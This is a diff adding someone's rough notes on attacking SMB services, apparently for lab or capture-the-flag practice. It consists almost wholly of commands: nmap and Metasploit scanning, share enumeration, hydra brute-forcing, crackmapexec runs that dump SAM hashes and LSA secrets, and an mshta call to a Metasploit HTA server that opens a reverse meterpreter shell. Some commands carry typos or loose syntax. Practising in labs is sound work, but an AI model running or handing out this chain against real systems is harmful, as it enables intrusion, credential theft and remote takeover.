@@ -1,0 +1,87 @@
+how to perform smb attack
+
+first find the opem smb ports
+nmap <target ip>
+
+2.locate .nse | grep smb
+
+3.nmap  -sC -p 139,445 <ip>
+nmap  --script=smb*.nse -p 445,139 <ip>
+
+
+4.how to find  version of smb
+nmap  -sV -p445,139 <ip>
+
+Got the version then look for exploitable payloads.
+
+5.for exact version detection use metaploite
+msf
+use smb_version
+show options
+set RHOST <ip>
+exploit
+ got the version
+exit
+
+6.how to check for shares
+smbmap  --help
+smbmap  -H <ip> 
+
+smbmap -H <ip>  -R (check for recursively acess)
+
+7. how to listout all the shares
+smbclient -L \\\\ip\\
+
+8.how to connect with the shares
+smbclient \\\\ip\\tmp
+
+
+
+USING CRACKMAPEXEC TOOL
+1.nmap <ip>
+2. nmap -p445  --script smb-protocols <ip>
+3.hydraa  -L[give the path of list file of default username ] -P [password] smb2
+4.check the ip of the target machine
+crackmapexec smb <ip>  -u username -p 'password'  -x ipconfig
+5.dump the password hashes 
+crackmapexec smb <ip> -u username -p 'password'   -x --sam
+6.dumping lsa secrets
+crackmapexec smb <ip> -u username -p 'password'  -x --lsa
+
+7.searching for all the shares
+crackmapexec smb <ip>  -u username  -p 'password'  --shares
+
+8.open the msf console in the other tab
+msfconsole  -q
+type - search hta_server
+type use exploit/windows/misc/hta_server
+type- exploit
+copy Local ip link
+
+9.back to the previous tab
+crackmapexec smb <ip>  -u username  -p 'password'  -x 'mshta.exe <paste the link>'
+
+and see the reverse meterpreter shell is connected in msfconsole.
+
+type - sessions 
+session -i 1
+ 
+
+10 .search for the flag
+pwd
+dir
+cat flag.txt
+got the flag 
+
+
+
+
+
+smb services 
+rpc services - hacktricks
+mssql service - 
+Impacket - github , tutorial 
+web at the end 
+Cloud Agent vulnerabiltities  -
+ 
+
